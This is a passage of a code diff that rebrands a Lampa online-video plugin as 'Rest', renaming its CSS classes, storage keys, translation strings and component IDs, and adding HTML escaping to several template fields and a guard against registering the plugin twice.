+          var image = html.find('.rest-online-prestige__img');
           if (object.balanser) image.hide();
           if (!serial) {
             if (choice.movie_view == hash_behold) scroll_to_element = html;
@@ -1469,7 +1461,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
           }
           if (serial && !episode) {
             image.append(
-              '<div class="online-prestige__episode-number">' +
+              '<div class="rest-online-prestige__episode-number">' +
               formatEpisodeNumber(element.episode || index + 1) +
               '</div>'
             );
@@ -1481,11 +1473,11 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
               img.src = './img/img_broken.svg';
             };
             img.onload = function () {
-              image.addClass('online-prestige__img--loaded');
+              image.addClass('rest-online-prestige__img--loaded');
               loader.remove();
               if (serial)
                 image.append(
-                  '<div class="online-prestige__episode-number">' +
+                  '<div class="rest-online-prestige__episode-number">' +
                   formatEpisodeNumber(element.episode || index + 1) +
                   '</div>'
                 );
@@ -1494,23 +1486,23 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
             images.push(img);
             element.thumbnail = img.src;
           }
-          html.find('.online-prestige__timeline').append(Lampa.Timeline.render(element.timeline));
+          html.find('.rest-online-prestige__timeline').append(Lampa.Timeline.render(element.timeline));
           if (viewed.indexOf(hash_behold) !== -1) {
             scroll_to_mark = html;
             html
-              .find('.online-prestige__img')
-              .append('<div class="online-prestige__viewed">' + Lampa.Template.get('icon_viewed', {}, true) + '</div>');
+              .find('.rest-online-prestige__img')
+              .append('<div class="rest-online-prestige__viewed">' + Lampa.Template.get('icon_viewed', {}, true) + '</div>');
           }
           element.mark = function () {
-            viewed = Lampa.Storage.cache('online_view', 5000, []);
+            viewed = Lampa.Storage.cache('rest_online_view', 5000, []);
             if (viewed.indexOf(hash_behold) == -1) {
               viewed.push(hash_behold);
-              Lampa.Storage.set('online_view', viewed);
-              if (html.find('.online-prestige__viewed').length == 0) {
+              Lampa.Storage.set('rest_online_view', viewed);
+              if (html.find('.rest-online-prestige__viewed').length == 0) {
                 html
-                  .find('.online-prestige__img')
+                  .find('.rest-online-prestige__img')
                   .append(
-                    '<div class="online-prestige__viewed">' + Lampa.Template.get('icon_viewed', {}, true) + '</div>'
+                    '<div class="rest-online-prestige__viewed">' + Lampa.Template.get('icon_viewed', {}, true) + '</div>'
                   );
               }
             }
@@ -1535,12 +1527,12 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
             });
           };
           element.unmark = function () {
-            viewed = Lampa.Storage.cache('online_view', 5000, []);
+            viewed = Lampa.Storage.cache('rest_online_view', 5000, []);
             if (viewed.indexOf(hash_behold) !== -1) {
               Lampa.Arrays.remove(viewed, hash_behold);
-              Lampa.Storage.set('online_view', viewed);
-              Lampa.Storage.remove('online_view', hash_behold);
-              html.find('.online-prestige__viewed').remove();
+              Lampa.Storage.set('rest_online_view', viewed);
+              Lampa.Storage.remove('rest_online_view', hash_behold);
+              html.find('.rest-online-prestige__viewed').remove();
             }
           };
           element.timeclear = function () {
@@ -1586,35 +1578,35 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
             if (episode.vote_average)
               info.push(
                 Lampa.Template.get(
-                  'lampac_prestige_rate',
+                  'rest_lampac_prestige_rate',
                   {
                     rate: parseFloat(episode.vote_average + '').toFixed(1)
                   },
                   true
                 )
               );
-            if (episode.air_date) info.push(Lampa.Utils.parseTime(episode.air_date).full);
+            if (episode.air_date) info.push(escapeHtml(Lampa.Utils.parseTime(episode.air_date).full));
             var air = new Date((episode.air_date + '').replace(/-/g, '/'));
             var now = Date.now();
             var day = Math.round((air.getTime() - now) / (24 * 60 * 60 * 1000));
             var txt = Lampa.Lang.translate('full_episode_days_left') + ': ' + day;
-            var html = Lampa.Template.get('lampac_prestige_full', {
+            var html = Lampa.Template.get('rest_lampac_prestige_full', {
               time: Lampa.Utils.secondsToTime((episode ? episode.runtime : object.movie.runtime) * 60, true),
               info: info.length
                 ? info
                   .map(function (i) {
                     return '<span>' + i + '</span>';
                   })
-                  .join('<span class="online-prestige-split">●</span>')
+                  .join('<span class="rest-online-prestige-split">●</span>')
                 : '',
-              title: episode.name,
-              quality: day > 0 ? txt : ''
+              title: escapeHtml(episode.name),
+              quality: escapeHtml(day > 0 ? txt : '')
             });
-            var loader = html.find('.online-prestige__loader');
-            var image = html.find('.online-prestige__img');
+            var loader = html.find('.rest-online-prestige__loader');
+            var image = html.find('.rest-online-prestige__img');
             var season = items[0] ? items[0].season : 1;
             html
-              .find('.online-prestige__timeline')
+              .find('.rest-online-prestige__timeline')
               .append(
                 Lampa.Timeline.render(
                   Lampa.Timeline.view(
@@ -1628,10 +1620,10 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
                 img.src = './img/img_broken.svg';
               };
               img.onload = function () {
-                image.addClass('online-prestige__img--loaded');
+                image.addClass('rest-online-prestige__img--loaded');
                 loader.remove();
                 image.append(
-                  '<div class="online-prestige__episode-number">' +
+                  '<div class="rest-online-prestige__episode-number">' +
                   formatEpisodeNumber(episode.episode_number) +
                   '</div>'
                 );
@@ -1641,7 +1633,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
             } else {
               loader.remove();
               image.append(
-                '<div class="online-prestige__episode-number">' +
+                '<div class="rest-online-prestige__episode-number">' +
                 formatEpisodeNumber(episode.episode_number) +
                 '</div>'
               );
@@ -1662,7 +1654,9 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         Lampa.Controller.enable('content');
       });
     };
-
+    /**
+     * Меню
+     */
     this.contextMenu = function (params) {
       params.html
         .on('hover:long', function () {
@@ -1686,7 +1680,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
               player: 'lampa'
             });
             menu.push({
-              title: Lampa.Lang.translate('lampac_video'),
+              title: Lampa.Lang.translate('rest_lampac_video'),
               separator: true
             });
             menu.push({
@@ -1707,7 +1701,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
                 copylink: true
               });
             }
-            if (window.lampac_online_context_menu) window.lampac_online_context_menu.push(menu, extra, params);
+            if (window.rest_lampac_online_context_menu) window.rest_lampac_online_context_menu.push(menu, extra, params);
             menu.push({
               title: Lampa.Lang.translate('more'),
               separator: true
@@ -1719,16 +1713,16 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
               params.element.translate_voice
             ) {
               menu.push({
-                title: Lampa.Lang.translate('lampac_voice_subscribe'),
+                title: Lampa.Lang.translate('rest_lampac_voice_subscribe'),
                 subscribe: true
               });
             }
             menu.push({
-              title: Lampa.Lang.translate('lampac_clear_all_marks'),
+              title: Lampa.Lang.translate('rest_lampac_clear_all_marks'),
               clearallmark: true
             });
             menu.push({
-              title: Lampa.Lang.translate('lampac_clear_all_timecodes'),
+              title: Lampa.Lang.translate('rest_lampac_clear_all_timecodes'),
               timeclearall: true
             });
             Lampa.Select.show({
@@ -1743,7 +1737,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
                 if (a.timeclear) params.element.timeclear();
                 if (a.clearallmark) params.onClearAllMark();
                 if (a.timeclearall) params.onClearAllTime();
-                if (window.lampac_online_context_menu) window.lampac_online_context_menu.onSelect(a, params);
+                if (window.rest_lampac_online_context_menu) window.rest_lampac_online_context_menu.onSelect(a, params);
                 Lampa.Controller.toggle(enabled);
                 if (a.player) {
                   Lampa.Player.runas(a.player);
@@ -1797,10 +1791,10 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
                       voice: params.element.translate_voice
                     },
                     function () {
-                      Lampa.Noty.show(Lampa.Lang.translate('lampac_voice_success'));
+                      Lampa.Noty.show(Lampa.Lang.translate('rest_lampac_voice_success'));
                     },
                     function () {
-                      Lampa.Noty.show(Lampa.Lang.translate('lampac_voice_error'));
+                      Lampa.Noty.show(Lampa.Lang.translate('rest_lampac_voice_error'));
                     }
                   );
                 }
@@ -1810,29 +1804,31 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
           params.onFile(show);
         })
         .on('hover:focus', function () {
-          if (Lampa.Helper) Lampa.Helper.show('online_file', Lampa.Lang.translate('helper_online_file'), params.html);
+          if (Lampa.Helper) Lampa.Helper.show('rest_online_file', Lampa.Lang.translate('rest_helper_online_file'), params.html);
         });
     };
-
+    /**
+     * Показать пустой результат
+     */
     this.empty = function () {
-      var html = Lampa.Template.get('lampac_does_not_answer', {});
-      html.find('.online-empty__buttons').remove();
-      html.find('.online-empty__title').text(Lampa.Lang.translate('empty_title_two'));
-      html.find('.online-empty__time').text(Lampa.Lang.translate('empty_text'));
+      var html = Lampa.Template.get('rest_lampac_does_not_answer', {});
+      html.find('.rest-online-empty__buttons').remove();
+      html.find('.rest-online-empty__title').text(Lampa.Lang.translate('empty_title_two'));
+      html.find('.rest-online-empty__time').text(Lampa.Lang.translate('empty_text'));
       scroll.clear();
       scroll.append(html);
       this.loading(false);
     };
     this.noConnectToServer = function (er) {
-      var html = Lampa.Template.get('lampac_does_not_answer', {});
-      html.find('.online-empty__buttons').remove();
-      html.find('.online-empty__title').text(Lampa.Lang.translate('title_error'));
+      var html = Lampa.Template.get('rest_lampac_does_not_answer', {});
+      html.find('.rest-online-empty__buttons').remove();
+      html.find('.rest-online-empty__title').text(Lampa.Lang.translate('title_error'));
       html
-        .find('.online-empty__time')
+        .find('.rest-online-empty__time')
         .text(
           er && er.accsdb
             ? er.msg
-            : Lampa.Lang.translate('lampac_does_not_answer_text').replace(
+            : Lampa.Lang.translate('rest_lampac_does_not_answer_text').replace(
                 '{balanser}',
                 sources[balanser] ? sources[balanser].name : balanser
               )
@@ -1844,10 +1840,10 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
     this.doesNotAnswer = function (er) {
       var _this9 = this;
       this.reset();
-      var html = Lampa.Template.get('lampac_does_not_answer', {
+      var html = Lampa.Template.get('rest_lampac_does_not_answer', {
         balanser: balanser
       });
-      if (er && er.accsdb) html.find('.online-empty__title').html(er.msg);
+      if (er && er.accsdb) html.find('.rest-online-empty__title').html(er.msg);
 
       var tic = er && er.accsdb ? 10 : 5;
       html.find('.cancel').on('hover:enter', function () {
@@ -1882,11 +1878,13 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
       });
       return last_episode;
     };
-
+    // ── activity lifecycle ──
     this.background = function () {
       Lampa.Background.immediately(Lampa.Utils.cardImgBackgroundBlur(object.movie));
     };
-
+    /**
+     * Начать навигацию по файлам
+     */
     this.start = function () {
       if (Lampa.Activity.active().activity !== this.activity) return;
       if (!initialized) {
@@ -1958,7 +1956,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
       title: spiderName,
       search: function (params, oncomplite) {
         function searchComplite(links) {
-          var keys = filterBalansers(Lampa.Arrays.getKeys(links) || []);
+          var keys = Lampa.Arrays.getKeys(links);
 
           if (keys.length) {
             var status = new Lampa.Status(keys.length);
@@ -1974,7 +1972,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
                     item.title = Lampa.Utils.capitalizeFirstLetter(item.title);
                     item.release_date = item.year || '0000';
                     item.balanser = spiderUri;
-                    item.source = PLUGIN_ID;
+                    item.source = 'rest_lampac';
                     if (item.img !== undefined) {
                       if (item.img.charAt(0) === '/') item.img = Defined.localhost + item.img.substring(1);
                       if (item.img.indexOf('/proxyimg') !== -1) item.img = account(item.img);
@@ -1989,7 +1987,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
                         title: name,
                         results: cards
                       },
-                      PLUGIN_ID
+                      'rest_lampac'
                     )
                   );
                 }
@@ -2066,7 +2064,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         Lampa.Activity.push({
           url: params.element.url,
           title: 'Lampac - ' + params.element.title,
-          component: PLUGIN_ID,
+          component: 'rest_lampac',
           movie: params.element,
           page: 1,
           search: params.element.title,
@@ -2083,18 +2081,17 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
   function startPlugin() {
     if (window.lampa_settings && window.lampa_settings.read_only) return;
 
-    window[PLUGIN_FLAG] = true;
-    Lampa.Component.add(PLUGIN_ID, component);
+    Lampa.Component.add('rest_lampac', component);
     var manifest = {
       type: 'video',
       version: LAMPAC_VERSION,
-      name: PLUGIN_NAME,
+      name: 'Rest',
       description: 'Плагин для просмотра онлайн сериалов и фильмов',
-      component: PLUGIN_ID,
-      icon: PLUGIN_ICON,
+      component: 'rest_lampac',
+      icon: REST_ICON,
       onContextMenu: function onContextMenu(object) {
         return {
-          name: Lampa.Lang.translate('lampac_watch'),
+          name: Lampa.Lang.translate('rest_lampac_watch'),
           description: ''
         };
       },
@@ -2106,8 +2103,8 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
 
         Lampa.Activity.push({
           url: '',
-          title: Lampa.Lang.translate('title_online'),
-          component: PLUGIN_ID,
+          title: Lampa.Lang.translate('rest_title_online'),
+          component: 'rest_lampac',
           search: all[id] ? all[id] : object.title,
           search_one: object.title,
           search_two: object.original_title,
@@ -2117,134 +2114,137 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         });
       }
     };
-    addSourceSearch(PLUGIN_NAME + ' Spider', 'spider');
-    addSourceSearch(PLUGIN_NAME + ' Anime', 'spider/anime');
-
+    addSourceSearch('Rest', 'spider');
+    addSourceSearch('Rest - Anime', 'spider/anime');
     if (Array.isArray(Lampa.Manifest.plugins)) {
-      Lampa.Manifest.plugins.push(manifest);
+      if (!Lampa.Manifest.plugins.some(function (entry) { return entry && entry.component === 'rest_lampac'; })) {
+        Lampa.Manifest.plugins.push(manifest);
+      }
     } else if (Lampa.Manifest.plugins) {
-      Lampa.Manifest.plugins = [Lampa.Manifest.plugins, manifest];
+      if (Lampa.Manifest.plugins.component !== 'rest_lampac') {
+        Lampa.Manifest.plugins = [Lampa.Manifest.plugins, manifest];
+      }
     } else {
       Lampa.Manifest.plugins = manifest;
     }
     Lampa.Lang.add({
-      lampac_watch: {
+      rest_lampac_watch: {
         //
         ru: 'Смотреть онлайн',
         en: 'Watch online',
         uk: 'Дивитися онлайн',
         zh: '在线观看'
       },
-      lampac_video: {
+      rest_lampac_video: {
         //
         ru: 'Видео',
         en: 'Video',
         uk: 'Відео',
         zh: '视频'
       },
-      lampac_no_watch_history: {
+      rest_lampac_no_watch_history: {
         ru: 'Нет истории просмотра',
         en: 'No browsing history',
         uk: 'Немає історії перегляду',
         zh: '没有浏览历史'
       },
-      lampac_nolink: {
+      rest_lampac_nolink: {
         ru: 'Не удалось извлечь ссылку',
         uk: 'Неможливо отримати посилання',
         en: 'Failed to fetch link',
         zh: '获取链接失败'
       },
-      lampac_balanser: {
+      rest_lampac_balanser: {
         //
         ru: 'Источник',
         uk: 'Джерело',
         en: 'Source',
         zh: '来源'
       },
-      helper_online_file: {
+      rest_helper_online_file: {
         //
         ru: 'Удерживайте клавишу "ОК" для вызова контекстного меню',
         uk: 'Утримуйте клавішу "ОК" для виклику контекстного меню',
         en: 'Hold the "OK" key to bring up the context menu',
         zh: '按住“确定”键调出上下文菜单'
       },
-      title_online: {
+      rest_title_online: {
         //
         ru: 'Онлайн',
         uk: 'Онлайн',
         en: 'Online',
         zh: '在线的'
       },
-      lampac_voice_subscribe: {
+      rest_lampac_voice_subscribe: {
         //
         ru: 'Подписаться на перевод',
         uk: 'Підписатися на переклад',
         en: 'Subscribe to translation',
         zh: '订阅翻译'
       },
-      lampac_voice_success: {
+      rest_lampac_voice_success: {
         //
         ru: 'Вы успешно подписались',
         uk: 'Ви успішно підписалися',
         en: 'You have successfully subscribed',
         zh: '您已成功订阅'
       },
-      lampac_voice_error: {
+      rest_lampac_voice_error: {
         //
         ru: 'Возникла ошибка',
         uk: 'Виникла помилка',
         en: 'An error has occurred',
         zh: '发生了错误'
       },
-      lampac_clear_all_marks: {
+      rest_lampac_clear_all_marks: {
         //
         ru: 'Очистить все метки',
         uk: 'Очистити всі мітки',
         en: 'Clear all labels',
         zh: '清除所有标签'
       },
-      lampac_clear_all_timecodes: {
+      rest_lampac_clear_all_timecodes: {
         //
         ru: 'Очистить все тайм-коды',
         uk: 'Очистити всі тайм-коди',
         en: 'Clear all timecodes',
         zh: '清除所有时间代码'
       },
-      lampac_change_balanser: {
+      rest_lampac_change_balanser: {
         //
         ru: 'Изменить балансер',
         uk: 'Змінити балансер',
         en: 'Change balancer',
         zh: '更改平衡器'
       },
-      lampac_balanser_dont_work: {
+      rest_lampac_balanser_dont_work: {
         //
         ru: 'Поиск на ({balanser}) не дал результатов',
         uk: 'Пошук на ({balanser}) не дав результатів',
         en: 'Search on ({balanser}) did not return any results',
         zh: '搜索 ({balanser}) 未返回任何结果'
       },
-      lampac_balanser_timeout: {
+      rest_lampac_balanser_timeout: {
         //
         ru: 'Источник будет переключен автоматически через <span class="timeout">10</span> секунд.',
         uk: 'Джерело буде автоматично переключено через <span class="timeout">10</span> секунд.',
         en: 'The source will be switched automatically after <span class="timeout">10</span> seconds.',
         zh: '平衡器将在<span class="timeout">10</span>秒内自动切换。'
       },
-      lampac_does_not_answer_text: {
+      rest_lampac_does_not_answer_text: {
         ru: 'Поиск на ({balanser}) не дал результатов',
         uk: 'Пошук на ({balanser}) не дав результатів',
         en: 'Search on ({balanser}) did not return any results',
         zh: '搜索 ({balanser}) 未返回任何结果'
       }
     });
-
+    // ── UI assets: CSS + Lampa templates ──
     function lampacCssHtml() {
       return [
         '<style>',
         '@charset \'UTF-8\';',
         '/* ── prestige card ── */',
-        '.online-prestige {',
+        '.rest-online-prestige {',
         '  position: relative;',
         '  -webkit-border-radius: 0.3em;',
         '  border-radius: 0.3em;',
@@ -2255,7 +2255,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  display: -ms-flexbox;',
         '  display: flex;',
         '}',
-        '.online-prestige__body {',
+        '.rest-online-prestige__body {',
         '  padding: 1.2em;',
         '  line-height: 1.3;',
         '  -webkit-box-flex: 1;',
@@ -2266,11 +2266,11 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  position: relative;',
         '}',
         '@media screen and (max-width: 480px) {',
-        '  .online-prestige__body {',
+        '  .rest-online-prestige__body {',
         '    padding: 0.8em 1.2em;',
         '  }',
         '}',
-        '.online-prestige__img {',
+        '.rest-online-prestige__img {',
         '  position: relative;',
         '  width: 13em;',
         '  -webkit-flex-shrink: 0;',
@@ -2278,7 +2278,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  flex-shrink: 0;',
         '  min-height: 8.2em;',
         '}',
-        '.online-prestige__img > img {',
+        '.rest-online-prestige__img > img {',
         '  position: absolute;',
         '  top: 0;',
         '  left: 0;',
@@ -2294,26 +2294,26 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  -moz-transition: opacity 0.3s;',
         '  transition: opacity 0.3s;',
         '}',
-        '.online-prestige__img--loaded > img {',
+        '.rest-online-prestige__img--loaded > img {',
         '  opacity: 1;',
         '}',
         '@media screen and (max-width: 480px) {',
-        '  .online-prestige__img {',
+        '  .rest-online-prestige__img {',
         '    width: 7em;',
         '    min-height: 6em;',
         '  }',
         '}',
-        '.online-prestige__folder {',
+        '.rest-online-prestige__folder {',
         '  padding: 1em;',
         '  -webkit-flex-shrink: 0;',
         '  -ms-flex-negative: 0;',
         '  flex-shrink: 0;',
         '}',
-        '.online-prestige__folder > svg {',
+        '.rest-online-prestige__folder > svg {',
         '  width: 4.4em !important;',
         '  height: 4.4em !important;',
         '}',
-        '.online-prestige__viewed {',
+        '.rest-online-prestige__viewed {',
         '  position: absolute;',
         '  top: 1em;',
         '  left: 1em;',
@@ -2323,11 +2323,11 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  padding: 0.25em;',
         '  font-size: 0.76em;',
         '}',
-        '.online-prestige__viewed > svg {',
+        '.rest-online-prestige__viewed > svg {',
         '  width: 1.5em !important;',
         '  height: 1.5em !important;',
         '}',
-        '.online-prestige__episode-number {',
+        '.rest-online-prestige__episode-number {',
         '  position: absolute;',
         '  top: 0;',
         '  left: 0;',
@@ -2350,7 +2350,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  justify-content: center;',
         '  font-size: 2em;',
         '}',
-        '.online-prestige__loader {',
+        '.rest-online-prestige__loader {',
         '  position: absolute;',
         '  top: 50%;',
         '  left: 50%;',
@@ -2363,8 +2363,8 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  -o-background-size: contain;',
         '  background-size: contain;',
         '}',
-        '.online-prestige__head,',
-        '.online-prestige__footer {',
+        '.rest-online-prestige__head,',
+        '.rest-online-prestige__footer {',
         '  display: -webkit-box;',
         '  display: -webkit-flex;',
         '  display: -moz-box;',
@@ -2381,13 +2381,13 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  -ms-flex-align: center;',
         '  align-items: center;',
         '}',
-        '.online-prestige__timeline {',
+        '.rest-online-prestige__timeline {',
         '  margin: 0.8em 0;',
         '}',
-        '.online-prestige__timeline > .time-line {',
+        '.rest-online-prestige__timeline > .time-line {',
         '  display: block !important;',
         '}',
-        '.online-prestige__title {',
+        '.rest-online-prestige__title {',
         '  font-size: 1.7em;',
         '  overflow: hidden;',
         '  -o-text-overflow: ellipsis;',
@@ -2398,14 +2398,14 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  -webkit-box-orient: vertical;',
         '}',
         '@media screen and (max-width: 480px) {',
-        '  .online-prestige__title {',
+        '  .rest-online-prestige__title {',
         '    font-size: 1.4em;',
         '  }',
         '}',
-        '.online-prestige__time {',
+        '.rest-online-prestige__time {',
         '  padding-left: 2em;',
         '}',
-        '.online-prestige__info {',
+        '.rest-online-prestige__info {',
         '  display: -webkit-box;',
         '  display: -webkit-flex;',
         '  display: -moz-box;',
@@ -2417,7 +2417,7 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  -ms-flex-align: center;',
         '  align-items: center;',
         '}',
-        '.online-prestige__info > * {',
+        '.rest-online-prestige__info > * {',
         '  overflow: hidden;',
         '  -o-text-overflow: ellipsis;',
         '  text-overflow: ellipsis;',
@@ -2426,27 +2426,27 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  line-clamp: 1;',
         '  -webkit-box-orient: vertical;',
         '}',
-        '.online-prestige__quality {',
+        '.rest-online-prestige__quality {',
         '  padding-left: 1em;',
         '  white-space: nowrap;',
         '}',
-        '.online-prestige__scan-file {',
+        '.rest-online-prestige__scan-file {',
         '  position: absolute;',
         '  bottom: 0;',
         '  left: 0;',
         '  right: 0;',
         '}',
-        '.online-prestige__scan-file .broadcast__scan {',
+        '.rest-online-prestige__scan-file .broadcast__scan {',
         '  margin: 0;',
         '}',
-        '.online-prestige .online-prestige-split {',
+        '.rest-online-prestige .rest-online-prestige-split {',
         '  font-size: 0.8em;',
         '  margin: 0 1em;',
         '  -webkit-flex-shrink: 0;',
         '  -ms-flex-negative: 0;',
         '  flex-shrink: 0;',
         '}',
-        '.online-prestige.focus::after {',
+        '.rest-online-prestige.focus::after {',
         '  content: \'\';',
         '  position: absolute;',
         '  top: -0.6em;',
@@ -2459,21 +2459,21 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  z-index: -1;',
         '  pointer-events: none;',
         '}',
-        '.online-prestige + .online-prestige {',
+        '.rest-online-prestige + .rest-online-prestige {',
         '  margin-top: 1.5em;',
         '}',
-        '.online-prestige--folder .online-prestige__footer {',
+        '.rest-online-prestige--folder .rest-online-prestige__footer {',
         '  margin-top: 0.8em;',
         '}',
         '/* ── watched row ── */',
-        '.online-prestige-watched {',
+        '.rest-online-prestige-watched {',
         '  padding: 1em;',
         '}',
-        '.online-prestige-watched__icon > svg {',
+        '.rest-online-prestige-watched__icon > svg {',
         '  width: 1.5em;',
         '  height: 1.5em;',
         '}',
-        '.online-prestige-watched__body {',
+        '.rest-online-prestige-watched__body {',
         '  padding-left: 1em;',
         '  padding-top: 0.1em;',
         '  display: -webkit-box;',
@@ -2485,14 +2485,14 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  -ms-flex-wrap: wrap;',
         '  flex-wrap: wrap;',
         '}',
-        '.online-prestige-watched__body > span + span::before {',
+        '.rest-online-prestige-watched__body > span + span::before {',
         '  content: \' ● \';',
         '  vertical-align: top;',
         '  display: inline-block;',
         '  margin: 0 0.5em;',
         '}',
         '/* ── rate badge ── */',
-        '.online-prestige-rate {',
+        '.rest-online-prestige-rate {',
         '  display: -webkit-inline-box;',
         '  display: -webkit-inline-flex;',
         '  display: -moz-inline-box;',
@@ -2504,39 +2504,39 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  -ms-flex-align: center;',
         '  align-items: center;',
         '}',
-        '.online-prestige-rate > svg {',
+        '.rest-online-prestige-rate > svg {',
         '  width: 1.3em !important;',
         '  height: 1.3em !important;',
         '}',
-        '.online-prestige-rate > span {',
+        '.rest-online-prestige-rate > span {',
         '  font-weight: 600;',
         '  font-size: 1.1em;',
         '  padding-left: 0.7em;',
         '}',
         '/* ── empty / error ── */',
-        '.online-empty {',
+        '.rest-online-empty {',
         '  line-height: 1.4;',
         '}',
-        '.online-empty__title {',
+        '.rest-online-empty__title {',
         '  font-size: 1.8em;',
         '  margin-bottom: 0.3em;',
         '}',
-        '.online-empty__time {',
+        '.rest-online-empty__time {',
         '  font-size: 1.2em;',
         '  font-weight: 300;',
         '  margin-bottom: 1.6em;',
         '}',
-        '.online-empty__buttons {',
+        '.rest-online-empty__buttons {',
         '  display: -webkit-box;',
         '  display: -webkit-flex;',
         '  display: -moz-box;',
         '  display: -ms-flexbox;',
         '  display: flex;',
         '}',
-        '.online-empty__buttons > * + * {',
+        '.rest-online-empty__buttons > * + * {',
         '  margin-left: 1em;',
         '}',
-        '.online-empty__button {',
+        '.rest-online-empty__button {',
         '  background: rgba(0, 0, 0, 0.3);',
         '  font-size: 1.2em;',
         '  padding: 0.5em 1.2em;',
@@ -2544,17 +2544,17 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  border-radius: 0.2em;',
         '  margin-bottom: 2.4em;',
         '}',
-        '.online-empty__button.focus {',
+        '.rest-online-empty__button.focus {',
         '  background: #fff;',
         '  color: black;',
         '}',
-        '.online-empty__templates .online-empty-template:nth-child(2) {',
+        '.rest-online-empty__templates .rest-online-empty-template:nth-child(2) {',
         '  opacity: 0.5;',
         '}',
-        '.online-empty__templates .online-empty-template:nth-child(3) {',
+        '.rest-online-empty__templates .rest-online-empty-template:nth-child(3) {',
         '  opacity: 0.2;',
         '}',
-        '.online-empty-template {',
+        '.rest-online-empty-template {',
         '  background-color: rgba(255, 255, 255, 0.3);',
         '  padding: 1em;',
         '  display: -webkit-box;',
@@ -2570,21 +2570,21 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
         '  -webkit-border-radius: 0.3em;',
         '  border-radius: 0.3em;',
         '}',
-        '.online-empty-template > * {',
+        '.rest-online-empty-template > * {',
         '  background: rgba(0, 0, 0, 0.3);',
         '  -webkit-border-radius: 0.3em;',
         '  border-radius: 0.3em;',
         '}',
-        '.online-empty-template__ico {',
+        '.rest-online-empty-template__ico {',
         '  width: 4em;',
         '  height: 4em;',
         '  margin-right: 2.4em;',
         '}',
-        '.online-empty-template__body {',
+        '.rest-online-empty-template__body {',
         '  height: 1.7em;',
         '  width: 70%;',
         '}',
-        '.online-empty-template + .online-empty-template {',
+        '.rest-online-empty-template + .rest-online-empty-template {',
         '  margin-top: 1em;',
         '}',
         '</style>'
@@ -2592,77 +2592,77 @@ window.rch_nws[hostkey].Registry = function RchRegistry(client, startConnection)
     }
 
     var LAMPAC_TEMPLATE_PRESTIGE_FULL = [
-      '<div class="online-prestige online-prestige--full selector">',
-      '  <div class="online-prestige__img">',
+      '<div class="rest-online-prestige rest-online-prestige--full selector">',
+      '  <div class="rest-online-prestige__img">',
       '    <img alt="">',
-      '    <div class="online-prestige__loader"></div>',
+      '    <div class="rest-online-prestige__loader"></div>',
       '  </div>',
-      '  <div class="online-prestige__body">',
-      '    <div class="online-prestige__head">',
-      '      <div class="online-prestige__title">{title}</div>',
-      '      <div class="online-prestige__time">{time}</div>',
+      '  <div class="rest-online-prestige__body">',
+      '    <div class="rest-online-prestige__head">',
+      '      <div class="rest-online-prestige__title">{title}</div>',
+      '      <div class="rest-online-prestige__time">{time}</div>',
       '    </div>',
-      '    <div class="online-prestige__timeline"></div>',
-      '    <div class="online-prestige__footer">',
-      '      <div class="online-prestige__info">{info}</div>',
-      '      <div class="online-prestige__quality">{quality}</div>',
+      '    <div class="rest-online-prestige__timeline"></div>',
+      '    <div class="rest-online-prestige__footer">',
+      '      <div class="rest-online-prestige__info">{info}</div>',
+      '      <div class="rest-online-prestige__quality">{quality}</div>',
       '    </div>',
       '  </div>',
       '</div>'
     ].join('\n');
 
     var LAMPAC_TEMPLATE_CONTENT_LOADING = [
-      '<div class="online-empty">',
+      '<div class="rest-online-empty">',
       '  <div class="broadcast__scan"><div></div></div>',
-      '  <div class="online-empty__templates">',
-      '    <div class="online-empty-template selector">',
-      '      <div class="online-empty-template__ico"></div>',
-      '      <div class="online-empty-template__body"></div>',
+      '  <div class="rest-online-empty__templates">',
+      '    <div class="rest-online-empty-template selector">',
+      '      <div class="rest-online-empty-template__ico"></div>',
+      '      <div class="rest-online-empty-template__body"></div>',
       '    </div>',
-      '    <div class="online-empty-template">',
-      '      <div class="online-empty-template__ico"></div>',
-      '      <div class="online-empty-template__body"></div>',
+      '    <div class="rest-online-empty-template">',
